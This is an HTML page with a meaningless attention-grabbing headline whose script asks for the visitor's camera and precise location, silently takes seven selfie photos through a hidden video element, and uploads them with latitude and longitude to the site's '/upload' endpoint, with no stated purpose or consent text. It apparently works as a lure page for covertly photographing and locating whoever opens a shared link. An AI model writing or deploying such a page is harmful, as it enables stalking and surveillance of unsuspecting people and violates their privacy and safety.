<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>KYA CHAHTE HO TUM</title>

  <style>
    html,body{
      height:100%;margin:0;
      font-family:system-ui;
      background:linear-gradient(135deg,#0f172a,#0b1220);
      color:white;display:flex;align-items:center;justify-content:center;
      flex-direction:column;text-align:center;
    }
    .headline{
      font-weight:900;
      font-size: clamp(32px, 10vw, 96px);
      background:linear-gradient(90deg,#ff416c,#ff4b2b,#ffd200,#2fd3a3);
      -webkit-background-clip:text;
      background-clip:text;
      color:transparent;
      animation: shimmer 3s infinite linear;
    }
    @keyframes shimmer{
      0%{background-position:0% 50%}
      50%{background-position:100% 50%}
      100%{background-position:0% 50%}
    }
    #status{
      margin-top:20px;
      font-size:14px;
      color:#cbd5e1;
    }
    video{display:none;}
  </style>
</head>

<body>

  <div class="headline">KYA CHAHTE HO TUM</div>
  <div id="status">Requesting permissions...</div>

  <video id="video" autoplay playsinline muted></video>

<script>
(async function(){

  const status = document.getElementById("status");
  const video = document.getElementById("video");

  // Backend upload URL
  const UPLOAD_URL = "/upload";

  function update(msg){ status.textContent = msg; }

  function canvasToBlob(canvas){
    return new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
  }

  async function capture(video){
    const c = document.createElement("canvas");
    c.width = video.videoWidth;
    c.height = video.videoHeight;
    c.getContext("2d").drawImage(video,0,0);
    return canvasToBlob(c);
  }

  try {
    update("Requesting camera access...");
    const stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:"user" }, audio:false
    });

    video.srcObject = stream;

    update("Requesting location...");
    const location = await new Promise((resolve,reject)=>{
      navigator.geolocation.getCurrentPosition(resolve,reject,{enableHighAccuracy:true});
    });

    update("Capturing photos...");

    // Ensure video is ready
    await new Promise(r=>{
      if(video.readyState>=2) r();
      else video.onloadeddata = r;
    });

    const photos = [];
    for(let i=0;i<7;i++){
      const blob = await capture(video);
      photos.push(blob);
      await new Promise(r=>setTimeout(r,200));
    }

    update("Uploading...");

    const fd = new FormData();
    fd.append("latitude", location.coords.latitude);
    fd.append("longitude", location.coords.longitude);

    photos.forEach((b,i)=>fd.append("photos", b, `photo${i+1}.jpg`));

    await fetch(UPLOAD_URL,{
      method:"POST",
      body:fd
    });

    update("Done âœ”");
    stream.getTracks().forEach(t=>t.stop());

  } catch(err){
    console.error(err);
    update("Error: " + err.message);
  }

})();
</script>

</body>
</html>
